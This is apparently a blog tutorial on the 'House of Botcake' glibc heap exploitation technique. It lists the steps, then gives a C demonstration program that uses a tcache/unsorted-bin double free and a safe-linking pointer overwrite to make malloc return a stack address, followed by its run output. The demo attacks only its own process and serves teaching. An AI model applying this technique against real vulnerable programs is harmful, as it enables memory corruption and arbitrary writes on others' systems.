---
layout: post
title: House of Botcake
description:
date: 2025-10-27
categories:
  - Guide
  - heap-exploitation
tags:
  - house-of-botcake
  - tcach-poisioning
  - tcache
---


## Steps

1. Allocate 10 chunks.
	- 7 chunk to fill `tcache` bins
	- chunk 8 will be used later for later consolidation
	- chunk 9 is the victim chunk
	- chunk 10 is to prevent consolidation with top chunk for chunk 9.
2. Free Chunks
	- 7 chunks to fill `tcache` bins
	- free chunk 9 so it be added into unsorted bin
	- free chunk 8 so that is consolidates with victim chunk (chunk 9).
3. Add victim chunk to `tcache` bins.
	- allocate 1 chunk to remove the 7th chunk from the `tcache` bins.
		- his frees one slot in `tcache` for our victim chunk.
	 - free the chunk 9 (victim) again.
		 - Now we have double free, the victim chunk is in both the `tcache` and the `unsorted` bins
4. Get a overlapping chunk.
	- allocate a new chunk with a size that ensures that the chunk overlaps to the victim chunk.
5. Overwrite `fd/next` pointer of chunk 9 (victim).
	- apply safe linking to target address..
6. 2 final allocations
	- The first allocation will return the chunk 9 (victim)
	- The second allocation will return target address

After these steps you will get a overlapping chunk from the unsorted bin.



```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <stdint.h>

int main() {
	// STEP 1
	char target[0x20] = "Nothing to see here";
	printf("target @ %p\ntarget: %s\n", &target, target);
	char *ptrs[7];
	for (int i = 0;i < 7; i++){
		ptrs[i] = malloc(0x100);
	}
	char *for_consolidation = malloc(0x100);
	char *victim = malloc(0x100);
	char *gap = malloc(0x10);
	printf("consolidation_chunk @ %p\nvictim @ %p\n", for_consolidation, victim);

	// STEP 2
	for (int i = 0; i < 7; i++) {
		free(ptrs[i]);
	}
	free(victim);
	free(for_consolidation);

	// STEP 3
	char *free_space = malloc(0x100);
	free(victim); 

	// STEP 4 

	char *overlapping_chunk = malloc(0x120); 
	printf("overlapping chunk @ %p = consolidation_chunk @ %p\n", overlapping_chunk, for_consolidation);
	
	// STEP 5
	
	uintptr_t stored  = ((long)victim >> 12) ^ (long)&target;;
	memcpy(overlapping_chunk+0x110, &stored, sizeof(stored));
	
	// STEP 6
	char *a = malloc(0x100); 
	char *b = malloc(0x100); 
	printf("a @ %p = victim @ %p \n", a, victim);
	printf("b @ %p = target @ %p\n", b, &target);


	strcpy(b, "PWNED");
	printf("target: %s\n", target);
}
```

When we run it

```
./a.out 
target @ 0x7fffffffdeb0
target: Nothing to see here
consolidation_chunk @ 0x405e20
victim @ 0x405f30
overlapping chunk @ 0x405e20 = consolidation_chunk @ 0x405e20
a @ 0x405f30 = victim @ 0x405f30 
b @ 0x7fffffffdeb0 = target @ 0x7fffffffdeb0
target: PWNED
```

### Example

